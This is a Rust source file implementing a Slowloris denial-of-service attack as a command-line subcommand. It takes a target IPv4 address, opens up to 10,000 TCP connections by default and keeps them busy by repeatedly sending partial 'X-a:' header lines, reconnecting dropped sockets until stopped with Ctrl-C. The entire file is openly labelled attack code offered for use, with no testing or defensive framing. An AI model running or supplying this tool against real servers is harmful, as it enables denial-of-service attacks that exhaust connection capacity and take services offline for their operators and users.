use std::{
    env,
    io::Write,
    net::{TcpStream, ToSocketAddrs},
    process,
    sync::mpsc::{channel, Receiver},
};

use log::{debug, error, info};
use rand::Rng;

pub fn slowloris(c: &seahorse::Context) {
    if c.bool_flag("verbose") {
        env::set_var("RUST_LOG", "DEBUG");
    } else {
        env::set_var("RUST_LOG", "INFO");
    }
    env_logger::init();

    if c.args.is_empty() {
        error!("Please provide a target ipv4 address");
        return;
    }
    let ip = c.args[0].clone();

    let sock_cnt = c.int_flag("socket").unwrap_or(10000);
    let rx = ctrlc_handler();

    info!("Starting slowloris attack on {}", ip);
    info!("If you want to stop the attack, press Ctrl-C");
    execute(ip, sock_cnt as usize, rx);
    println!("Exiting...");
}

fn execute<P: ToSocketAddrs>(ip: P, sock_cnt: usize, rx: std::sync::mpsc::Receiver<()>) {
    info!("Creating {} sockets...", sock_cnt);
    let mut sock_list = Vec::new();
    for s in 0..sock_cnt {
        match init_socket(&ip) {
            Ok(sock) => {
                sock_list.push(sock);
            }
            Err(e) => {
                debug!("Socket {} failed: {}", s, e);
            }
        }
    }
    info!("Done. Attacking...");
    let mut rng = rand::thread_rng();
    loop {
        if rx.try_recv().is_ok() {
            break;
        }
        debug!(
            "Sending keep-alive headers... socket count: {}",
            sock_list.len()
        );
        let mut i = 0;
        while i < sock_list.len() {
            let msg = format!("X-a: {}\r", rng.gen::<u32>());
            if let Err(e) = sock_list[i].write_all(msg.as_bytes()) {
                debug!("Socket failed. Removing...: {}", e);
                sock_list.remove(i);
            } else {
                i += 1;
            }
        }
        for i in sock_list.len()..sock_cnt {
            match init_socket(&ip) {
                Ok(sock) => {
                    sock_list.push(sock);
                }
                Err(e) => {
                    debug!("Socket {} failed: {}", i, e);
                }
            }
        }
    }
}
fn init_socket<P: ToSocketAddrs>(to: P) -> Result<TcpStream, std::io::Error> {
    TcpStream::connect(to)
}

fn ctrlc_handler() -> Receiver<()> {
    let (tx, rx) = channel();
    if let Err(e) =
        ctrlc::set_handler(move || tx.send(()).expect("Could not send signal on channel."))
    {
        error!("Error setting Ctrl-C handler: {}", e);
        process::exit(1);
    };
    rx
}
